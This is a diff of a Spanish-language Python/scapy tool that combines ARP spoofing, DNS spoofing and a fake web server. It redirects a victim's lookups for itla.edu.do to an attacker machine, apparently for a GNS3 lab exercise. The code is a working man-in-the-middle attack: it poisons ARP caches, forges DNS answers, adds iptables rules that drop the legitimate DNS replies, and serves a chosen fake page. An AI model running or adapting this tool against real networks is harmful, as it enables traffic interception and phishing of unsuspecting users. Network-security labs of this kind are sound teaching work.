@@ -1,10 +1,13 @@
+#!/usr/bin/env python3
 import os
 import sys
 import time
 import signal
 import threading
 import subprocess
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from pathlib import Path
+from functools import partial
+from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
 
 try:
     from scapy.all import (
@@ -35,7 +38,7 @@ original_ip_forward = None
 def require_root():
     if os.geteuid() != 0:
         print("Ejecuta como root:")
-        print("sudo python3 dns-spoof-attack.py")
+        print("sudo python3 dns-spoofing.py")
         sys.exit(1)
 
 
@@ -73,49 +76,51 @@ def remove_iptables_rules():
         run_cmd(delete_rule)
 
 
-class SpoofWebHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        html = f"""<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>DNS Spoofing Lab</title>
-</head>
-<body style="background:#111;color:white;font-family:Arial;text-align:center;padding-top:80px;">
-  <h1>DNS Spoofing Exitoso</h1>
-  <h2>itla.edu.do apunta al servicio web local del atacante</h2>
-  <p>Servidor atacante: 20.25.8.46</p>
-  <p>Cliente: {self.client_address[0]}</p>
-</body>
-</html>
-"""
-        data = html.encode()
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(data)))
-        self.send_header("Connection", "close")
-        self.end_headers()
-        self.wfile.write(data)
-
+class QuietWebHandler(SimpleHTTPRequestHandler):
     def log_message(self, fmt, *args):
-        print(f"[HTTP] {self.client_address[0]} pidió {self.path}")
+        client_ip = self.client_address[0]
+        print(f"[HTTP] {client_ip} pidió {self.path}")
 
 
-def start_web_server(fake_ip):
+def start_web_server(fake_ip, web_path):
+    global running
+
+    web_dir = Path(web_path).expanduser().resolve()
+
+    if not web_dir.exists() or not web_dir.is_dir():
+        print(f"[!] La ruta web no existe o no es carpeta: {web_dir}")
+        print("[!] Crea la carpeta y pon un index.html dentro.")
+        return
+
+    index_file = web_dir / "index.html"
+    if not index_file.exists():
+        print(f"[!] No encontré index.html en: {web_dir}")
+        print("[!] Crea un archivo index.html dentro de esa carpeta.")
+        return
+
     try:
-        httpd = HTTPServer(("0.0.0.0", 80), SpoofWebHandler)
-        print(f"[+] Web local activa en http://{fake_ip}/")
+        handler = partial(QuietWebHandler, directory=str(web_dir))
+        httpd = ThreadingHTTPServer((fake_ip, 80), handler)
+        httpd.timeout = 1
+
+        print(f"[+] Web falsa activa en http://{fake_ip}/")
+        print(f"[+] Sirviendo carpeta: {web_dir}")
+
         while running:
             httpd.handle_request()
+
+        httpd.server_close()
+
     except OSError as e:
-        print(f"[!] No pude abrir el puerto 80: {e}")
-        print("[!] Cierra Apache/Nginx si están usando el puerto 80.")
+        print(f"[!] No pude abrir el puerto 80 en {fake_ip}: {e}")
+        print("[!] Cierra Apache/Nginx/python http.server si están usando el puerto 80.")
+        print("[!] El DNS spoofing puede seguir, pero la página falsa no subió desde este script.")
 
 
 def arp_poison_loop(iface, attacker_mac, victim_ip, victim_mac, gateway_ip, gateway_mac):
     print("[+] ARP spoofing activo")
     print(f"[+] Víctima {victim_ip} creerá que {gateway_ip} está en {attacker_mac}")
-    print(f"[+] Router {gateway_ip} creerá que {victim_ip} está en {attacker_mac}")
+    print(f"[+] Objetivo {gateway_ip} creerá que {victim_ip} está en {attacker_mac}")
 
     while running:
         pkt1 = (
@@ -217,11 +222,11 @@ def dns_spoof(pkt, iface, attacker_mac, victim_ip, fake_ip, target_domain):
             src=pkt[IP].dst,
             dst=pkt[IP].src,
             ttl=64,
-            flags=0
+            flags=0,
         )
         / UDP(
             sport=53,
-            dport=pkt[UDP].sport
+            dport=pkt[UDP].sport,
         )
         / DNS(
             id=pkt[DNS].id,
@@ -242,24 +247,23 @@ def dns_spoof(pkt, iface, attacker_mac, victim_ip, fake_ip, target_domain):
                 rrname=pkt[DNSQR].qname,
                 type="A",
                 rclass="IN",
-                ttl=300,
+                ttl=60,
                 rdata=fake_ip,
             ),
         )
     )
 
-    # Recalcular checksums automáticamente
     if IP in dns_response:
         del dns_response[IP].chksum
     if UDP in dns_response:
         del dns_response[UDP].chksum
 
-    # Enviar varias veces para que VPCS no pierda la respuesta
     for _ in range(5):
         sendp(dns_response, iface=iface, verbose=False)
         time.sleep(0.05)
 
     print(f"[DNS SPOOF] {qname} -> {fake_ip} enviado a {pkt[IP].src}")
+
 
 def stop_handler(signum, frame):
     global running
@@ -273,20 +277,22 @@ def main():
     signal.signal(signal.SIGTERM, stop_handler)
 
     require_root()
+    conf.verb = 0
 
     print("""
 ====================================================
  DNS SPOOFING / DNS POISONING MITM LAB
- ARP Spoof + DNS Spoof + Web Local
+ ARP Spoof + DNS Spoof + Web falsa en puerto 80
  Uso exclusivo en laboratorio GNS3 autorizado
 ====================================================
 """)
 
     iface = ask("Interfaz de ataque", "eth0")
-    victim_ip = ask("IP víctima", "20.25.8.47")
-    gateway_ip = ask("IP router/gateway", "20.25.8.45")
+    victim_ip = ask("IP víctima", "20.25.8.48")
+    gateway_ip = ask("IP DNS legítimo / gateway a suplantar", "20.25.8.49")
     fake_ip = ask("IP web local atacante", "20.25.8.46")
     target_domain = ask("Dominio a falsificar", "itla.edu.do")
+    web_path = ask("Ruta de la página falsa", "/home/kali/web-falsa")
 
     if iface != "eth0":
         print("[!] Por seguridad del lab, usa eth0. eth1 es NAT/Internet.")
@@ -299,29 +305,28 @@ def main():
 
     attacker_mac = get_if_hwaddr(iface)
 
-    print("[+] Resolviendo MAC de víctima y gateway...")
+    print("[+] Resolviendo MAC de víctima y DNS/gateway...")
     victim_mac = getmacbyip(victim_ip)
     gateway_mac = getmacbyip(gateway_ip)
 
     if not victim_mac:
         print(f"[!] No pude resolver MAC de la víctima {victim_ip}")
-        print("[!] Verifica que la PC esté encendida y en la misma VLAN.")
+        print("[!] Verifica que la víctima esté encendida y en la misma VLAN.")
         sys.exit(1)
 
     if not gateway_mac:
-        print(f"[!] No pude resolver MAC del gateway {gateway_ip}")
-        print("[!] Verifica que R1 esté encendido y en la misma VLAN.")
+        print(f"[!] No pude resolver MAC del DNS/gateway {gateway_ip}")
+        print("[!] Verifica que el DNS/gateway esté encendido y en la misma VLAN.")
         sys.exit(1)
 
-    print(f"[+] Atacante: {fake_ip} MAC {attacker_mac}")
-    print(f"[+] Víctima:  {victim_ip} MAC {victim_mac}")
-    print(f"[+] Gateway:  {gateway_ip} MAC {gateway_mac}")
+    print(f"[+] Atacante:     {fake_ip} MAC {attacker_mac}")
+    print(f"[+] Víctima:      {victim_ip} MAC {victim_mac}")
+    print(f"[+] DNS/Gateway:  {gateway_ip} MAC {gateway_mac}")
+    print(f"[+] Dominio fake: {target_domain} -> {fake_ip}")
 
     original_ip_forward = read_ip_forward()
     set_ip_forward("1")
 
-    # Bloquea respuestas DNS legítimas que vengan del DNS real hacia la víctima.
-    # Así la respuesta falsa de Kali gana.
     add_iptables_rule([
         "iptables", "-I", "FORWARD",
         "-p", "udp",
@@ -338,7 +343,11 @@ def main():
         "-j", "DROP",
     ])
 
-    web_thread = threading.Thread(target=start_web_server, args=(fake_ip,), daemon=True)
+    web_thread = threading.Thread(
+        target=start_web_server,
+        args=(fake_ip, web_path),
+        daemon=True,
+    )
     web_thread.start()
 
     poison_thread = threading.Thread(
@@ -349,9 +358,8 @@ def main():
     poison_thread.start()
 
     print("[+] Sniffing DNS activo")
-    print("[+] En la víctima prueba: ping itla.edu.do")
-    print("[+] Si tienes víctima Linux: curl http://itla.edu.do")
-    print("[+] Presiona Ctrl+C para detener y restaurar")
+    print("[+] En la víctima prueba: curl http://itla.edu.do")
+    print("[+] Presiona Ctrl+C para detener y restaurar ARP/iptables")
 
     try:
         sniff(
